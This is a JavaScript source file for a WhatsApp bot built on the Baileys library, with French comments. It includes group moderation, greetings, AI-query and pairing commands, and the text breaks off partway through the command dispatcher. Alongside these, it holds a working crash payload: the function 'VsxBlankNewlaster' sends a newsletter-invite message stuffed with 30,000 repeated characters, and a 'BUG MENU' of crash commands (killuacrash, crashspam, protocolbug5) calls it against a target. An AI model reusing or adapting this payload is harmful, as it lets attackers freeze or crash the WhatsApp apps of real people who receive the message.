/*
Dev : Natsu Tech a votre service 242053323191.
chacun connaît comment évolue les choses les choses de son côté, comme le disait Kalash criminel dans sauvagerie 4 ( grim and the flow ) Natsu toujours vif 242053323191
*/

import axios from 'axios';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { generateWAMessageFromContent, proto } from '@whiskeysockets/baileys';

const sleep = (ms) => new Promise(r => setTimeout(r, ms));
const __dirname = path.dirname(fileURLToPath(import.meta.url));
const DATA_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

// ─────────────────────────────────────────────────────────────────────────────
// CORE CONFIG
// ─────────────────────────────────────────────────────────────────────────────
export const PREFIX   = '.';
// Tous les préfixes acceptés pour appeler le bot
export const PREFIXES = ['.', '/', '!', '#', ',', '+'];
export const BOT_NAME = '𝙺𝚈𝙰𝚁𝙰 𝚇𝙱𝙾𝚃';
export const DEV_NAME = 'KILLUA OFFICIEL';

export const MENU_IMAGE   = 'https://i.ibb.co/bMw2Y4mK/RD32353437393339373733343240732e77686174736170702e6e6574-884547.png';
export const MENU_IMAGE_2 = 'https://i.ibb.co/mrKPq2NX/RD32353437393339373733343240732e77686174736170702e6e6574-520919.jpg';
export const MENU_IMAGES  = [MENU_IMAGE, MENU_IMAGE_2];
export const NEWSLETTER_JID  = '120363406589060879@newsletter'; //<== No change 
export const NEWSLETTER_NAME = '𝐊𝐈𝐋𝐋𝐔𝐀 𝐓𝐄𝐂𝐇';

// ─── OWNER INFO (édite ces valeurs avec tes vraies infos) ───────────────────
export const OWNER_NUMBER  = '243906905464';            // sans +, sans espaces
export const OWNER_NAME    = 'Killua';
export const OWNER_WA      = 'https://wa.me/243906905464';
export const OWNER_TG      = 'https://t.me/cabrinox';
export const OWNER_GITHUB  = 'https://github.com/cabrin21';
export const REPO_URL      = 'https://github.com/cabrin21/killua_xbot';
export const BOT_VERSION   = 'V1.2';

export const WA_CHANNELS = [
  'https://whatsapp.com/channel/0029VbCHB1eDjiOUGG4OCS2t',
  'https://whatsapp.com/channel/0029Vb6E9Kb84Om7UbQX431m',
];
export const WA_GROUPS = [
  'https://chat.whatsapp.com/FJmSNCa6q7oBkFV3hloAtQ',
  'https://chat.whatsapp.com/CY4GCf2RAhk1EpwLchhmad',
];

// Forwarded-from-channel context (makes messages look forwarded from newsletter)
export function forwardedContext() {
  return {
    isForwarded: true,
    forwardingScore: 999,
    forwardedNewsletterMessageInfo: {
      newsletterJid: NEWSLETTER_JID,
      newsletterName: NEWSLETTER_NAME,
      serverMessageId: -1,
    },
    externalAdReply: {
      title: BOT_NAME,
      body: `Dev: ${DEV_NAME}`,
      thumbnailUrl: MENU_IMAGE,
      sourceUrl: WA_CHANNELS[0],
      mediaType: 1,
      renderLargerThumbnail: false,
    },
  };
}

// ─────────────────────────────────────────────────────────────────────────────
// PERSISTENT STATE (sudo list, banned, settings…)
// ─────────────────────────────────────────────────────────────────────────────
const STATE_FILE = path.join(DATA_DIR, 'state.json');
function loadState() {
  try { return JSON.parse(fs.readFileSync(STATE_FILE, 'utf8')); } catch { return {}; }
}
function saveState(s) { fs.writeFileSync(STATE_FILE, JSON.stringify(s, null, 2)); }
function getState() {
  const s = loadState();
  s.sudo       ??= [];
  s.banned     ??= [];
  s.blocked    ??= [];
  s.antilink   ??= {};   // groupJid -> true/false
  s.antistatut  ??= {};   // groupJid -> true/false (blocks status mentions in groups)
  s.mode       ??= 'public'; // public | private
  s.autoread   ??= false;
  s.autobio    ??= false;
  s.autorecord ??= false;
  s.autotyping ??= false;
  s.autoviewsts ??= false;
  s.autoreact  ??= false;
  s.account    ??= '';
  s.warns      ??= {};   // jidGroup -> { userJid: count }
  s.afks       ??= {};   // userJid  -> { reason, since }
  s.prefix     ??= '.';
  s.welcome    ??= {};   // groupJid -> { enabled, text }
  s.goodbye    ??= {};   // groupJid -> { enabled, text }
  return s;
}
function updateState(fn) { const s = getState(); fn(s); saveState(s); return s; }


// ─────────────────────────────────────────────────────────────────────────────
// GROUP GREETING CONFIG
// ─────────────────────────────────────────────────────────────────────────────
const DEFAULT_WELCOME = `╭━━━〔 ✨ 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 〕━━━╮
┃
┃ 👤 𝐍𝐨𝐮𝐯𝐞𝐚𝐮 𝐦𝐞𝐦𝐛𝐫𝐞 : {user}
┃ 🏠 𝐆𝐫𝐨𝐮𝐩𝐞 : {group}
┃ 👥 𝐌𝐞𝐦𝐛𝐫𝐞𝐬 : {members}
┃
┃ 🎉 Bienvenue dans la communauté !
┃ 🤝 Nous sommes heureux de t'accueillir.
┃
┃ 📜 Tape *{prefix}menu* pour découvrir
┃ toutes les fonctionnalités de {bot}.
┃
╰━━━━━━━━━━━━━━━━━━━━━━╯

> 🤖 {bot}
> 👨‍💻 Dev : {dev}`;

const DEFAULT_GOODBYE = `╭━━━〔 👋 𝐆𝐎𝐎𝐃𝐁𝐘𝐄 〕━━━╮
┃
┃ 👤 {user}
┃ 🏠 {group}
┃
┃ 😢 Un membre vient de nous quitter.
┃ 💙 Merci pour ton passage parmi nous.
┃ 👋 Bonne continuation !
┃
╰━━━━━━━━━━━━━━━━━━━━━━╯

> 🤖 {bot}
> 👨‍💻 Dev : {dev}`;

function getGroupGreetingConfig(state, jid, type) {
  const key = type === 'goodbye' ? 'goodbye' : 'welcome';
  state[key] ??= {};

  const existing = state[key][jid];
  if (!existing || typeof existing !== 'object') {
    state[key][jid] = {
      enabled: true,
      text: key === 'welcome' ? DEFAULT_WELCOME : DEFAULT_GOODBYE,
    };
  } else {
    if (typeof existing.enabled !== 'boolean') existing.enabled = true;
    if (typeof existing.text !== 'string' || !existing.text.trim()) {
      existing.text = key === 'welcome' ? DEFAULT_WELCOME : DEFAULT_GOODBYE;
    }
  }

  return state[key][jid];
}

function renderGroupGreeting(text, vars = {}) {
  const values = {
    user: vars.user ?? '',
    group: vars.group ?? 'Notre groupe',
    members: vars.members ?? 0,
    count: vars.count ?? vars.members ?? 0,
    bot: vars.bot ?? BOT_NAME,
    dev: vars.dev ?? DEV_NAME,
    prefix: vars.prefix ?? PREFIX,
  };

  return String(text || DEFAULT_WELCOME).replace(
    /\{(user|group|members|count|bot|dev|prefix)\}/gi,
    (_, key) => values[key.toLowerCase()] ?? `{${key}}`
  );
}

function greetingHelp(prefix = PREFIX) {
  return `╭━━━〔 👋 𝐆𝐑𝐄𝐄𝐓𝐈𝐍𝐆𝐒 〕━━━╮
┃
┃ ${prefix}welcome on/off/status
┃ ${prefix}setwelcome <message>
┃ ${prefix}resetwelcome
┃
┃ ${prefix}goodbye on/off/status
┃ ${prefix}setgoodbye <message>
┃ ${prefix}resetgoodbye
┃
┃ Variables disponibles :
┃ {user} {group} {members} {bot}
┃ {dev} {prefix}
┃
╰━━━━━━━━━━━━━━━━━━━━━━╯`;
}

// ─────────────────────────────────────────────────────────────────────────────
// HELPERS
// ─────────────────────────────────────────────────────────────────────────────
const RAND = (arr) => arr[Math.floor(Math.random() * arr.length)];

export function getMessageText(msg) {
  if (!msg?.message) return '';
  const m = msg.message;
  const inner =
    m.ephemeralMessage?.message ||
    m.viewOnceMessage?.message ||
    m.viewOnceMessageV2?.message?.message ||
    m.documentWithCaptionMessage?.message ||
    null;
  const src = inner || m;
  return (
    src.conversation ||
    src.extendedTextMessage?.text ||
    src.imageMessage?.caption ||
    src.videoMessage?.caption ||
    src.documentMessage?.caption ||
    src.buttonsResponseMessage?.selectedDisplayText ||
    src.templateButtonReplyMessage?.selectedDisplayText ||
    src.listResponseMessage?.singleSelectReply?.selectedRowId ||
    ''
  ).trim();
}

function isGroup(jid) { return jid?.endsWith('@g.us'); }

// Detect WhatsApp status mentions, including current/future nested wrappers.
// Baileys exposes statusMentionMessage / groupStatusMentionMessage for these.
function containsStatusMention(message) {
  const seen = new WeakSet();

  const walk = (value, depth = 0) => {
    if (!value || depth > 7 || typeof value !== 'object') return false;
    if (seen.has(value)) return false;
    seen.add(value);

    if (Array.isArray(value)) {
      return value.some(item => walk(item, depth + 1));
    }

    for (const [key, child] of Object.entries(value)) {
      if (
        key === 'statusMentionMessage' ||
        key === 'groupStatusMentionMessage' ||
        key === 'statusMentionMessageInfo'
      ) {
        return Boolean(child);
      }

      if (child && typeof child === 'object' && walk(child, depth + 1)) {
        return true;
      }
    }

    return false;
  };

  return walk(message);
}

// In-memory cache for group metadata (60s TTL) — huge speed win
const _groupMetaCache = new Map(); // jid -> { meta, exp }
const GROUP_META_TTL = 60 * 1000;

async function getGroupAdmins(natsu, jid) {
  try {
    const now = Date.now();
    const cached = _groupMetaCache.get(jid);
    let meta;
    if (cached && cached.exp > now) {
      meta = cached.meta;
    } else {
      meta = await natsu.groupMetadata(jid);
      _groupMetaCache.set(jid, { meta, exp: now + GROUP_META_TTL });
    }
    const admins = meta.participants.filter(p => p.admin).map(p => p.id);
    const rawId = natsu.user?.id || '';
    const lidId = natsu.user?.lid || '';
    const botPhone = rawId.split(':')[0].split('@')[0];
    const botJid = botPhone ? `${botPhone}@s.whatsapp.net` : '';
    const botLid = lidId ? lidId.split(':')[0].split('@')[0] + '@lid' : '';
    const botIsAdmin =
      admins.includes(botJid) ||
      (botLid && admins.includes(botLid)) ||
      meta.participants.some(p => p.admin && (p.id === botJid || p.id === botLid));
    return { meta, admins, botIsAdmin, botJid };
  } catch { return { meta: null, admins: [], botIsAdmin: false, botJid: '' }; }
}

// Invalidate cache when a group changes
export function invalidateGroupCache(jid) { _groupMetaCache.delete(jid); }

// Check if a given JID is a group admin (handles both regular & LID format)
function isGroupAdmin(adminsList, userJid) {
  if (!userJid) return false;
  const phone = userJid.split('@')[0].split(':')[0];
  return adminsList.some(a => {
    const aPhone = a.split('@')[0].split(':')[0];
    return a === userJid || aPhone === phone;
  });
}

function sender(msg) {
  return msg.key.participant || msg.key.remoteJid;
}

function quotedMsg(msg) {
  const ctx = msg.message?.extendedTextMessage?.contextInfo;
  return ctx?.quotedMessage ? { quoted: ctx.quotedMessage, participant: ctx.participant } : null;
}

// Generic HTTP fallback over multiple free AI / download endpoints
// Timeout reduced from 10000ms to 6000ms — fail fast, try next URL sooner
async function tryFetch(urls) {
  for (const u of urls) {
    try {
      const r = await axios.get(u, { timeout: 6000, headers: { 'User-Agent': 'Mozilla/5.0' } });
      if (r.data) return r.data;
    } catch {}
  }
  return null;
}

// AI gateway helper — faster: shorter timeouts + race the first two providers
async function askAI(prompt, model = 'gpt') {
  const q = encodeURIComponent(prompt);
  const map = {
    gemini: 'gemini', gpt: 'openai', gpt4: 'openai', gpt5: 'openai-large',
    metaai: 'llama', deepseek: 'deepseek', qwen: 'qwen-coder',
    'grok-ai': 'openai', grok: 'openai', codeai: 'qwen-coder',
    story: 'openai', trivia: 'openai',
  };
  const m = map[model] || 'openai';
  const urls = [
    `https://text.pollinations.ai/${q}?model=${m}`,
    `https://text.pollinations.ai/${q}`,
    `https://api.dreaded.site/api/chatgpt?text=${q}`,
  ];
  const parse = (d) => {
    if (typeof d === 'string' && d.trim().startsWith('{')) {
      try { d = JSON.parse(d); } catch {}
    }
    return (typeof d === 'string')
      ? d
      : (d?.BK9 || d?.result || d?.response || d?.data?.response || d?.data?.message ||
         d?.message || d?.answer || d?.gpt4 || d?.result?.prompt || null);
  };
  const call = (u) => axios.get(u, { timeout: 6000, responseType: 'text', transformResponse: [(d) => d] })
    .then(r => parse(r.data)).then(a => a && String(a).trim() ? String(a).trim() : Promise.reject('empty'));
  try {
    return await Promise.any(urls.slice(0, 2).map(call));
  } catch {}
  for (const u of urls.slice(2)) {
    try { const a = await call(u); if (a) return a; } catch {}
  }
  return `🤖 [${model.toUpperCase()}] est occupé. Réessaie dans un instant.`;
}

// Image search / fetch helper — timeout reduced from 12s to 7s
async function fetchAnyImage(urls) {
  for (const u of urls) {
    try {
      const r = await axios.get(u, { timeout: 7000 });
      const d = r.data;
      const url =
        d?.url || d?.image || d?.message ||
        d?.result?.url || d?.result?.[0]?.url ||
        (Array.isArray(d?.images) && d.images[0]) ||
        (typeof d === 'string' && d.startsWith('http') ? d : null);
      if (url) return url;
    } catch {}
  }
  return null;
}

// Image cache (avoid re-downloading the menu picture on every call)
const _imgCache = new Map(); // url -> Buffer
async function getImageBuffer(url) {
  if (_imgCache.has(url)) return _imgCache.get(url);
  try {
    const r = await axios.get(url, { responseType: 'arraybuffer', timeout: 12000 });
    const buf = Buffer.from(r.data);
    _imgCache.set(url, buf);
    return buf;
  } catch { return null; }
}

// ─────────────────────────────────────────────────────────────────────────────
// it's here you add your funct bug 👇
// ─────────────────────────────────────────────────────────────────────────────
async function VsxBlankNewlaster(natsu, target) {
  const message = generateWAMessageFromContent(target, proto.Message.fromObject({
    newsletterAdminInviteMessage: {
      newsletterJid: "120363406589060879@newsletter",
      newsletterName: "ꦾ" + "ꦽ".repeat(30000),
      jpegThumbnail: Buffer.alloc(10),
      caption: "ꦾ" + "ꦽ".repeat(30000),
      inviteExpiration: Math.floor(Date.now() / 1000) + (7 * 24 * 60 * 60),
      inviteMessage: "Hi bro it's me from killua"
    },
    contextInfo: {
      mentionedJid: ["0@s.whatsapp.net"],
      forwardingScore: 1,
      isForwarded: true,
      businessMessageForwardInfo: {
        businessOwnerJid: "243906905464@s.whatsapp.net"
      },
      externalAdReply: {
        title: "ꦽ".repeat(30000),
        body: "ꦾ".repeat(30000),
        thumbnail: Buffer.alloc(10),
        mediaType: 1,
        renderLargerThumbnail: false,
        showAdAttribution: true,
      }
    }
  }), { userJid: natsu.user.id });
  await natsu.relayMessage(target, message.message, { messageId: message.key.id });
}

// Send image with forwarded context (uses cached buffer when possible)
async function sendImage(natsu, jid, url, caption, msg) {
  const buf = await getImageBuffer(url);
  const image = buf ? buf : { url };
  return natsu.sendMessage(jid,
    { image, caption: caption || '', contextInfo: forwardedContext() },
    { quoted: msg }
  );
}
async function sendText(natsu, jid, text, msg) {
  return natsu.sendMessage(jid,
    { text, contextInfo: forwardedContext() },
    { quoted: msg }
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// GAMES — in-memory state
// ─────────────────────────────────────────────────────────────────────────────
const games = {
  tictactoe: new Map(), hangman: new Map(), guess: new Map(),
  math: new Map(), emoji: new Map(),
};
const HANGMAN_WORDS = ['javascript','whatsapp','queen','baileys','telegram','africa','python','kingdom'];

// ─────────────────────────────────────────────────────────────────────────────
// MENU BUILDER
// ─────────────────────────────────────────────────────────────────────────────
const MENU_GROUPS = {
    '╭━━〔GROUP MENU〕━━▢': ['tagall','hidetag','tagadmins','promote','demote','kick','add','mute','unmute','left','grouplink','resetlink','kickadmins','kickall','listadmins','listonline','opentime','closetime','antilink','vcf','creategroup','join','closegc','opengc','welcome','setwelcome','resetwelcome','goodbye','setgoodbye','resetgoodbye','antilink','antistatut','warn','warns','resetwarn'],
    '╭━━〔OWNER MENU〕━━▢': ['owner','repo','setpp','setprefix','restart','eval','ban','unban','self','public','autoread','autobio','autorecording','autotyping','autoviewstatus','autoreact','block','unblock','delete','setaccount','addsudo','delsudo','listsudo','fixowner','getbot','broadcast','mode','ping','alive','runtime'],
    '╭━━〔FUN MENU〕━━▢': ['truth','dare','joke','meme','ship','rate','flirt','roast','compliment','wouldyou','8balladvice','urban','moviequote','triviafact','inspire','ascii','progquote','dadjoke','funfact','paptt'],
    '╭━━〔GAME MENU〕━━▢': ['rps','rpsls','dice','coin','coinbattle','numberbattle','numbattle','hangman','tictactoe','guess','math','emojiquiz','gamefact','toimg','take','steal','wm','qc'],
    '╭━━〔SOUND MENU〕━━▢': ['bass','blown','deep','earrape','fast','nightcore','reverse','robot','slow','smooth','squirrel','tts','say'],
    '╭━━〔MAIL MENU〕━━▢': ['newmail','readmail','deltmp','tempmail2','tempmail-inbox'],
    '╭━━〔OTHER MENU〕━━▢': ['weatherwiki','currency','time','qrcode','readqr','shorturl','myip','iplookup','jid','getpp','github','npm','ffstalk','npmstalk','imbd','dictionary','recipe','book','remind','calculate','mathfact','sciencefact','recipe-ingredient','horoscope','password','genpass','readmore','lidch','react-ch','translate','lyrics','afk','removebg','upscale','savestatus'],
    '╭━━〔IMAGE MENU〕━━▢': ['sfw','moe','aipic','hentai','chinagirl','bluearchive','boypic','carimage','random-girl','hijab-girl','indonesia-girl','japan-girl','korean-girl','loli','malaysia-girl','profile-pictures','tiktokgirl'],
    '╭━━〔AI MENU〕━━▢': ['ai','gpt','gpt4','gpt5','metaai','codeai','photoai','storyai','triviaai','deepseek','grok-ai','qwen','gemini'],
    '╭━━〔ANIME MENU〕━━▢': ['achar','aquote','arecommend','asearch','loli','maid','megumin','neko','shinobu','waifu'],
    '╭━━〔STICKER MENU〕━━▢': ['telegraph','url','sticker'],
    '╭━━〔DOWNLO MENU〕━━▢': ['apk','edit','fb','git','gitclone','insta','mega','mp4','pint','play','song','video','yta','ytmp3','ytv','tiktok','spotify'],
    '╭━━〔BUG MENU〕━━▢': ['fcxui','bugcampuran','killuacrash','crashspam','delayinvis','manzxeveryone','protocolbug5'],
    '╭━━〔CONNECT MENU〕━━▢': ['pair','connect'],
};

// Set de toutes les commandes connues — sert au déclenchement sans préfixe
export const KNOWN_CMDS = (() => {
  const s = new Set(['menu','help','list','ping','alive','runtime','uptime','del','prefix','private','public','self','mode','antistatut','antistatus']);
  for (const arr of Object.values(MENU_GROUPS)) for (const c of arr) s.add(c.toLowerCase());
  return s;
})();
// ─── Fonctions de crash supplémentaires (à adapter selon tes payloads) ───
async function ForcloseNew(natsu, target) {
    // Par défaut, on utilise VsxBlankNewlaster
    await VsxBlankNewlaster(natsu, target);
}
async function DelayInvis1(natsu, target) {
    await VsxBlankNewlaster(natsu, target);
}
async function Delayinvis2(natsu, target) {
    await VsxBlankNewlaster(natsu, target);
}
async function protocolbug5(natsu, target) {
    await VsxBlankNewlaster(natsu, target);
}
function buildMenu(userName = '') {
  const groups = MENU_GROUPS;

  let body = '';
  for (const [title, cmds] of Object.entries(groups)) {
    body += `\n*${title}*\n`;
    body += cmds.map((c) => `┃ ◈ ${PREFIX}${c}`).join('\n');
    body += '\n';
  }

  return `───────🍁───────
    *${BOT_NAME}*
 User: ${userName || 'You'}
 Prefixes: *${PREFIXES.join(' ')}*
 Owner: *${DEV_NAME}*
 Version: *4.0.1*
──────🌹────────

 *༼KILLUA × KYARA༽* 
«──────🌹─────»
 
${body}
━━━━━━━━━━━━━━━━━
> ${BOT_NAME} • ${DEV_NAME}`;
}

// ─────────────────────────────────────────────────────────────────────────────
// GROUP WELCOME / GOODBYE (ALWAYS ENABLED — no toggle needed)
// Triggered automatically on every join/leave detection in any group.
// ─────────────────────────────────────────────────────────────────────────────
export async function handleGroupWelcome(natsu, update = {}) {
  const { id, participants = [], action } = update;
  if (!id || !String(id).endsWith('@g.us')) return;
  if (!Array.isArray(participants) || !participants.length) return;

  const act = String(action || '').toLowerCase().trim();
  const isJoin = ['add', 'invite', 'join'].includes(act);
  const isLeave = ['remove', 'leave', 'kick'].includes(act);
  if (!isJoin && !isLeave) return;

  const state = getState();
  const type = isJoin ? 'welcome' : 'goodbye';
  const config = getGroupGreetingConfig(state, id, type);
  if (!config.enabled) return;

  let groupName = 'Notre groupe';
  let memberCount = 0;
  try {
    const meta = await natsu.groupMetadata(id);
    groupName = meta?.subject || groupName;
    memberCount = Array.isArray(meta?.participants) ? meta.participants.length : 0;
  } catch (e) {
    console.log(`⚠️ Group metadata unavailable for ${id}: ${e?.message || e}`);
  }

  const prefix = state.prefix || PREFIX;

  for (let i = 0; i < participants.length; i++) {
    const raw = participants[i];
    const jidP = typeof raw === 'string'
      ? raw
      : (raw?.id || raw?.jid || raw?.participant || '');

    if (!jidP || !jidP.includes('@') || jidP.endsWith('@g.us')) continue;

    const number = jidP.split('@')[0];
    const rendered = renderGroupGreeting(config.text, {
      user: `@${number}`,
      group: groupName,
      members: memberCount,
      bot: BOT_NAME,
      dev: DEV_NAME,
      prefix,
    });

    try {
      if (isJoin) {
        await natsu.sendMessage(id, {
          image: { url: MENU_IMAGE },
          caption: rendered,
          mentions: [jidP],
          contextInfo: forwardedContext(),
        });
        console.log(`👋 [WELCOME] ${number} → ${groupName}`);
      } else {
        await natsu.sendMessage(id, {
          text: rendered,
          mentions: [jidP],
          contextInfo: forwardedContext(),
        });
        console.log(`👋 [GOODBYE] ${number} ← ${groupName}`);
      }
    } catch (e) {
      console.log(`⚠️ ${type} send failed for ${number}: ${e?.message || e}`);
    }

    if (i < participants.length - 1) await sleep(700);
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// MAIN DISPATCHER
// ─────────────────────────────────────────────────────────────────────────────
export async function handleCommand(natsu, msg) {
  const jid = msg.key?.remoteJid;
  if (!jid) return;

  const state = getState();
  const senderJid = sender(msg);
  const senderNum = senderJid.split('@')[0];
  const isCreator = msg.key.fromMe || state.sudo.includes(senderNum);

  // Auto-react
  if (state.autoreact) {
    try { await natsu.sendMessage(jid, { react: { text: RAND(['🐛','✨','💫','🔥','⚡','💖']), key: msg.key } }); } catch {}
  }
  // Auto-read
  if (state.autoread) { try { await natsu.readMessages([msg.key]); } catch {} }
  // Auto view status
  if (state.autoviewsts && jid === 'status@broadcast') {
    try { await natsu.readMessages([msg.key]); } catch {}
  }

  // ── ANTISTATUT ───────────────────────────────────────────────────────────
  // Blocks WhatsApp status mentions shared into groups when enabled.
  // Admins are exempt. The bot must be admin to delete another member's message.
  if (isGroup(jid) && state.antistatut[jid] && containsStatusMention(msg.message)) {
    try {
      const { admins, botIsAdmin } = await getGroupAdmins(natsu, jid);
      const senderIsAdmin = isGroupAdmin(admins, senderJid);

      console.log(
        `🛡️ Antistatut hit in ${jid} by ${senderNum} ` +
        `(admin=${senderIsAdmin}, botAdmin=${botIsAdmin})`
      );

      if (!senderIsAdmin) {
        if (botIsAdmin) {
          try {
            await natsu.sendMessage(jid, { delete: msg.key });
          } catch (e) {
            console.log(`⚠️ Antistatut delete failed: ${e?.message || e}`);
          }

          try {
            await sendText(
              natsu,
              jid,
              `🛡️ *ANTISTATUT*\n\n` +
              `🚫 @${senderNum}, les mentions de statut sont interdites dans ce groupe.\n` +
              `🗑️ Message supprimé.`,
              msg
            );
          } catch {}
        } else {
          console.log(`⚠️ Antistatut active but bot is not admin in ${jid}.`);
        }

        return;
      }
    } catch (e) {
      console.log(`⚠️ Antistatut check failed: ${e?.message || e}`);
    }
  }

  const text = getMessageText(msg);
  if (!text) return;

  // ── AFK : si l'auteur est AFK, on l'enlève. Si quelqu'un mentionné est AFK, on prévient.
  try {
    if (state.afks?.[senderJid]) {
      const info = state.afks[senderJid];
      const mins = Math.floor((Date.now() - info.since) / 60000);
      updateState(s => { delete s.afks[senderJid]; });
      await natsu.sendMessage(jid, {
        text: `👋 Bon retour @${senderNum} ! Tu étais AFK depuis ${mins} min (${info.reason || 'aucune raison'}).`,
        mentions: [senderJid], contextInfo: forwardedContext(),
      }, { quoted: msg });
    }
    const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
    for (const mj of mentioned) {
      if (state.afks?.[mj]) {
        const info = state.afks[mj];
        await natsu.sendMessage(jid, {
          text: `💤 @${mj.split('@')[0]} est AFK — *${info.reason || 'sans raison'}*`,
          mentions: [mj], contextInfo: forwardedContext(),
        }, { quoted: msg });
      }
    }
  } catch {}

  // Détection du préfixe (plusieurs supportés) OU déclenchement sans préfixe
  // si le premier mot correspond à une commande connue.
  let usedPrefix = false;
  let raw = text;
  if (PREFIXES.includes(raw[0])) {
    raw = raw.slice(1).trim();
    usedPrefix = true;
  }
  const firstWord = raw.split(/\s+/)[0]?.toLowerCase() || '';
  const noPrefixMatch = !usedPrefix && KNOWN_CMDS.has(firstWord);

  if (!usedPrefix && !noPrefixMatch) {
    // ── ANTILINK ─────────────────────────────────────────────────────────────
    // Matches ANY URL (http/https, wa.me, t.me, chat.whatsapp.com, tiktok,
    // youtube, instagram, etc.) so it actually catches what users post.
    const LINK_RE = /(https?:\/\/\S+|www\.\S+|wa\.me\/\S+|t\.me\/\S+|chat\.whatsapp\.com\/\S+|\b[\w-]+\.(com|net|org|io|me|tv|gg|xyz|link|app|dev|co)\b\/?\S*)/i;
    if (isGroup(jid) && state.antilink?.[jid] && LINK_RE.test(text)) {
      const { admins, botIsAdmin } = await getGroupAdmins(natsu, jid);
      const senderIsAdmin = isGroupAdmin(admins, senderJid);
      console.log(`🔗 Antilink hit in ${jid} by ${senderNum} (admin=${senderIsAdmin}, botAdmin=${botIsAdmin})`);
      if (!senderIsAdmin) {
        if (!botIsAdmin) return sendText(natsu, jid, '⚠️ Antilink est activé, mais je dois être administrateur pour appliquer le kick.', msg);
        try { await natsu.sendMessage(jid, { delete: msg.key }); }
        catch (e) { console.log(`⚠️ antilink delete failed: ${e.message}`); }
        try { await natsu.groupParticipantsUpdate(jid, [senderJid], 'remove'); }
        catch (e) { console.log(`⚠️ antilink kick failed: ${e.message}`); }
        await natsu.sendMessage(jid, { text: `⛔ @${senderNum} a envoyé un lien.
🚫 Message supprimé et membre expulsé.`, mentions: [senderJid], contextInfo: forwardedContext() }, { quoted: msg });
        return;
      }
    }
    return;
  }

  const body  = raw;
  if (!body) return;
  const parts = body.split(/\s+/);
  const cmd   = parts[0].toLowerCase();
  const arg   = parts.slice(1).join(' ');
  const args  = parts.slice(1);

  // ── BOT ACCESS MODE ───────────────────────────────────────────────────────
  // public  = everyone can use normal commands
  // private = only owner/sudo can use commands
  // self    = legacy alias for private
  const botMode = String(state.mode || 'public').toLowerCase();
  const isPrivateMode = botMode === 'private' || botMode === 'self';
  const isOwnerOrSudo = Boolean(msg.key.fromMe) || state.sudo.includes(senderNum);

  if (isPrivateMode && !isOwnerOrSudo) {
    return;
  }
  // Banned users are silently ignored
  if (state.banned.includes(senderNum)) return;

  const reply = (t) => sendText(natsu, jid, t, msg);
  const img   = (u, c) => sendImage(natsu, jid, u, c, msg);

  try {
    switch (cmd) {

      // ═════════════════════════════════════════════════════════════════════
      // MENU / HELP
      // ═════════════════════════════════════════════════════════════════════
      case 'menu': case 'help': case 'list': {
        const name = msg.pushName || '';
        const pic = RAND(MENU_IMAGES);
        const buf = await getImageBuffer(pic);
        await natsu.sendMessage(jid, {
          image: buf ? buf : { url: pic },
          caption: buildMenu(name),
          contextInfo: forwardedContext(),
        }, { quoted: msg });
        break;
      }

      // ═════════════════════════════════════════════════════════════════════
      // CONNECT MENU — generate a pairing code so ANOTHER WhatsApp user
      // can link their number through this active bot (no Telegram needed)
      // ═════════════════════════════════════════════════════════════════════
      case 'pair': case 'connect': case 'bot': {
        const rawNumber = (arg || '').trim();
        if (!rawNumber) {
          await reply(
`🔗 *${BOT_NAME} — Pair a new number*

📌 *Usage:* *${PREFIX}${cmd} 243xxxxxxxx*
   Example: *${PREFIX}${cmd} 243068570352*

▢ International format, no \`+\`, no leading \`0\`.
▢ You will receive an 8-digit code (ABCD-1234).
▢ Open WhatsApp → Settings → Linked Devices →
   Link a Device → Use phone number → enter the code.

> ${BOT_NAME} • ${DEV_NAME}`);
          break;
        }
        const phone = rawNumber.replace(/\D/g, '');
        if (phone.length < 7 || phone.length > 15) {
          await reply(`❌ Invalid number. Use international format without \`+\`.`);
          break;
        }
        if (phone.startsWith('0')) {
          await reply(`❌ Remove the leading 0. Ex: *${PREFIX}${cmd} 243906905464*`);
          break;
        }
        await reply(`⏳ Generating pairing code for *+${phone}*...`);
        try {
          const { createSession } = await import('./whatsapp.js');
          const { code } = await createSession(phone);
          if (code) {
            await reply(
`«──────🌹─────»
   🔑 *PAIRING CODE*

 «──────🌹─────»

📞 Number: *+${phone}*
🔢 Code: *${code}*
⏰ Expires: *2 minutes*

*Steps on the target phone:*
WhatsApp → Settings → Linked Devices
→ Link a Device → Use phone number
→ Enter: *${code}*

✅ Connection is automatic.
> ${BOT_NAME} • ${DEV_NAME}`);
          } else {
            await reply(`✅ *+${phone}* is already connected to ${BOT_NAME}!`);
          }
        } catch (err) {
          await reply(`❌ Error: ${err.message}`);
        }
        break;
      }
      // ═════════════════════════════════════════════════════════════════════
      case 'ai': case 'gpt': case 'gpt4': case 'gpt5': case 'metaai':
      case 'deepseek': case 'grok-ai': case 'grok': case 'qwen': case 'gemini': {
        if (!arg) { await reply(`❌ Usage: *${PREFIX}${cmd} <prompt>*`); break; }
        const ans = await askAI(arg, cmd);
        await reply(`🤖 *${cmd.toUpperCase()}*\n\n${ans}`);
        break;
      }
      case 'codeai': {
        if (!arg) { await reply(`❌ Usage: *${PREFIX}codeai <task>*`); break; }
        const ans = await askAI(`You are a senior software engineer. Write clean code for: ${arg}`, 'codeai');
        await reply(`💻 *CODE AI*\n\n${ans}`);
        break;
      }
      case 'photoai': {
        if (!arg) { await reply(`❌ Usage: *${PREFIX}photoai <description>*`); break; }
        const url = `https://image.pollinations.ai/prompt/${encodeURIComponent(arg)}?width=768&height=768&nologo=true`;
        await img(url, `🎨 *PHOTO AI*\n📝 ${arg}`);
        break;
      }
      case 'storyai': {
        if (!arg) { await reply(`❌ Usage: *${PREFIX}storyai <theme>*`); break; }
        const ans = await askAI(`Write a short engaging story (~300 words) about: ${arg}`, 'story');
        await reply(`📖 *STORY AI*\n\n${ans}`);
        break;
      }
      case 'triviaai': {
        const ans = await askAI('Give me one interesting trivia question with the answer in parentheses.', 'trivia');
        await reply(`🧠 *TRIVIA AI*\n\n${ans}`);
        break;
      }

      // ═════════════════════════════════════════════════════════════════════
      // GROUP MENU
      // ═════════════════════════════════════════════════════════════════════
      case 'nsala':
case 'bnkk': {
if (!isGroup(jid)) {
await reply('❌ Cette commande nest disponible que dans les groupes.');
break;
}

// Récupérer les infos du groupe et vérifier si le bot est admin
const { admins, botIsAdmin } = await getGroupAdmins(natsu, jid);

